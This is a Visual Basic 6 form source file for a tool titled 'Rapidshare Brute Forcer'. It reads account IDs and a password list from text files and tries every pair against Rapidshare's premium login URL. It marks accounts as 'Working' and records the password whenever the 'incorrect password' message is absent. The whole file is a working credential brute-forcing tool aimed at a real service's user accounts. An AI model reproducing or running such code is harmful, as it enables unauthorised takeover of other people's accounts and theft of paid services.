VERSION 5.00
Object = "{48E59290-9880-11CF-9754-00AA00C00908}#1.0#0"; "MSINET.OCX"
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Begin VB.Form Rapidshare 
   Caption         =   "Rapidshare Brute Forcer"
   ClientHeight    =   5235
   ClientLeft      =   60
   ClientTop       =   345
   ClientWidth     =   7530
   LinkTopic       =   "Form1"
   ScaleHeight     =   5235
   ScaleWidth      =   7530
   StartUpPosition =   3  'Windows Default
   Begin VB.CommandButton LoadPasswords 
      Caption         =   "Load Passwords"
      Height          =   495
      Left            =   4440
      TabIndex        =   5
      Top             =   120
      Width           =   2895
   End
   Begin VB.CommandButton LoadAccounts 
      Caption         =   "Load Accounts"
      Height          =   495
      Left            =   120
      TabIndex        =   2
      Top             =   120
      Width           =   4155
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Check"
      Height          =   495
      Left            =   120
      TabIndex        =   0
      Top             =   4560
      Width           =   7275
   End
   Begin InetCtlsObjects.Inet Inet1 
      Left            =   1440
      Top             =   5280
      _ExtentX        =   1005
      _ExtentY        =   1005
      _Version        =   393216
   End
   Begin MSComctlLib.ListView lvAccounts 
      Height          =   2775
      Left            =   120
      TabIndex        =   3
      Top             =   840
      Width           =   4155
      _ExtentX        =   7329
      _ExtentY        =   4895
      View            =   3
      LabelWrap       =   -1  'True
      HideSelection   =   -1  'True
      FullRowSelect   =   -1  'True
      GridLines       =   -1  'True
      _Version        =   393217
      ForeColor       =   -2147483640
      BackColor       =   -2147483643
      BorderStyle     =   1
      Appearance      =   1
      NumItems        =   3
      BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         Text            =   "Login"
         Object.Width           =   2540
      EndProperty
      BeginProperty ColumnHeader(2) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   1
         Text            =   "Result"
         Object.Width           =   2540
      EndProperty
      BeginProperty ColumnHeader(3) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   2
         Text            =   "Password"
         Object.Width           =   2540
      EndProperty
   End
   Begin MSComctlLib.ListView Passwords 
      Height          =   2775
      Left            =   4440
      TabIndex        =   4
      Top             =   840
      Width           =   2955
      _ExtentX        =   5212
      _ExtentY        =   4895
      View            =   3
      LabelWrap       =   -1  'True
      HideSelection   =   -1  'True
      FullRowSelect   =   -1  'True
      GridLines       =   -1  'True
      _Version        =   393217
      ForeColor       =   -2147483640
      BackColor       =   -2147483643
      BorderStyle     =   1
      Appearance      =   1
      NumItems        =   2
      BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         Text            =   "Login"
         Object.Width           =   2540
      EndProperty
      BeginProperty ColumnHeader(2) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   1
         Text            =   "Result"
         Object.Width           =   2540
      EndProperty
   End
   Begin VB.Label Status 
      Appearance      =   0  'Flat
      BackColor       =   &H00E0E0E0&
      BorderStyle     =   1  'Fixed Single
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H000000FF&
      Height          =   495
      Left            =   120
      TabIndex        =   1
      Top             =   3840
      Width           =   7275
   End
End
Attribute VB_Name = "Rapidshare"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Command1_Click()
Dim i, j As Integer
Dim SURL As String
For i = 1 To lvAccounts.ListItems.Count
    For j = 1 To Passwords.ListItems.Count
        SURL = "http://rapidshare.com/cgi-bin/premium.cgi?accountid=" & lvAccounts.ListItems.Item(i) & "&password=" & Passwords.ListItems.Item(j) & "&premiumlogin=1"
        Account = Rapidshare.Inet1.OpenURL(SURL)
        If InStr(Account, "The Account has been found, but the password is incorrect.") Then
            Status.Caption = "The Account has been found, but the password is incorrect."
            lvAccounts.ListItems.Item(i).SubItems(1) = "Found"
        Else
            Status.Caption = "Account working"
            lvAccounts.ListItems.Item(i).SubItems(1) = "Working"
            lvAccounts.ListItems.Item(i).SubItems(2) = Passwords.ListItems.Item(j)
        End If
    Next j
Next i
Status.Caption = "FINISHED"
End Sub
Private Sub LoadPasswords_Click()
Programme = "passwords.txt"
Open Programme For Input Lock Read As #1
taille_o = LOF(1)
taille = taille_o / 1000
Do While Not EOF(1)
    Input #1, ligne
    With Passwords.ListItems.Add(, , ligne)
    End With
Loop
Close #1
End Sub
Private Sub LoadAccounts_Click()
Programme = "found_accounts.txt"
Open Programme For Input Lock Read As #1
taille_o = LOF(1)
taille = taille_o / 1000
Do While Not EOF(1)
    Input #1, ligne
    With lvAccounts.ListItems.Add(, , ligne)
        .SubItems(1) = "Not Checked"
    End With
Loop
Close #1
End Sub
